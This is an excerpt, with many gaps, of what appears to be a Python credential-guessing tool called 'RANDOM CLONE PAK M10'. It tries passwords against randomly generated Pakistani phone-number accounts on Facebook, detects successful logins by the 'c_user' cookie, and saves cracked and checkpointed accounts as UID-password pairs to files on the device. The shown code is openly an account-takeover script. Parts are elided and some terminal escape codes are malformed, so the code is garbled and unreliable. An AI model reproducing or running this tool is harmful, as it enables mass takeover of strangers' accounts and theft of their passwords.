...
░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░
 ...
 '\033[1;97m'╭──────────•◈•──────────╮
 '\033[1;97m'[-] TOOLS     :\031[1;32m RANDOM 
 '\033[1;97m'[-] VERSION   :\031[1;32m M10 NEON 
 '\033[1;97m'[-] AUTHOR    :\030[1;32m ANTO
 '\033[1;97m'[-] GITHUB    :\0331[1;32m FOX-AR
 '\033[1;97m'[-] TEAM      :\034[1;32m AR CYBER 
 '\033[1;97m'╰──────────•◈•──────────╯"""
...
def Anto():
    ...
    print(f"")
    print(f"{RED}[01] {WHITE}RANDOM CLONE PAK  M10")
...
def Tabii():
    ...
    print(f" 0321 ,0316 ,0308 ,0309,92345")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[•]---------------------[ANTO-OK]--------------------[•]\nEMAIL : '+uid+'\nUID   : '+cid+'  '+ps+ '\n[•]---------------------------------------------------[•]')
                cek_apk(session,coki)
                open('/sdcard/ANTO-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print('\033[1;31m[•]--------------------[ANTO-CP]---------------------[•]\n  '+cid+' • '+ps+ '\n[•]------------------------------------------------[•]\033[1;97m')
                open('/sdcard/ANTO-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
